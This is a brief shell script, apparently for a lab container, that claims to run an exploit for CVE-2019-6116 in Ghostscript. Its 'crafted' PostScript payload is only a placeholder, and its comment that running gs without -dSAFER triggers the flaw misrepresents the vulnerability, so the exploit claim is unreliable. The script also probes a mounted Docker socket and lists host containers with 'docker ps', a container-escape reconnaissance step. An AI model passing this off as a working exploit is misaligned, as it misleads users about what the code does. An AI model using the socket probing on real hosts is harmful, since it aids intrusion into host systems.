#!/bin/sh

echo "Running exploit for CVE-2019-6116..."

# Show Ghostscript version
gs --version || echo "Ghostscript not found"

# Create a minimal crafted PostScript payload that satisfies the stack requirements
cat <<'EOF' > /tmp/payload.ps
%!PS
/ephemeralProc { pop } bind def
(placeholder) ephemeralProc
EOF

# Execute Ghostscript without -dSAFER to trigger the vulnerability
gs -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=/dev/null /tmp/payload.ps || echo "Ghostscript execution failed"

# Attempt to list host Docker containers via the mounted socket
if [ -S /var/run/docker.sock ]; then
  docker ps
else
  echo "Docker socket not available"
fi

# Keep container alive for demonstration purposes
tail -f /dev/null